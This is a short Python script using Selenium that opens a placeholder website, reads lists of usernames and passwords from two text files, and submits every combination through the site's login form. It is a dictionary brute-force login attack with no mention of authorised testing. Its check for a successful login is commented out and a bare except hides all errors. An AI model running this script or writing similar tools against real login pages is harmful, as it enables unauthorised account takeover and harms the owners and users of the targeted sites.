#!/usr/bin/python3
# -*- coding: UTF-8 -*-
import time
from selenium import webdriver
browser = webdriver.Chrome()
#设置浏览器窗口
browser.set_window_size(1080,800)
# 打开网址
browser.get('http://xxx.xxx.com')
# 定位元素输入
try:
         u = open('username.txt','r',encoding='utf-8')
         f = open('password.txt','r',encoding='utf-8')
         u1 = u.readlines()
         f1 = f.readlines()
         for username in u1:
            for password in f1:
                username = username.strip()
                password = password.strip()
                print(username.strip()+password.strip())
                inputFirst = browser.find_element_by_id('username').send_keys(username)
                inputFirst = browser.find_element_by_id('password').send_keys(password)
                # 定位元素点击
                inputFirst = browser.find_element_by_id('login-submit').click()
                time.sleep(1)
                inputFirst = browser.find_element_by_id('username').clear()

                #登陆成功标志
                #suCess = browser.find_element_by_id("login_error")
                #print(suCess.text)
                # 睡眠设置
except:
     pass




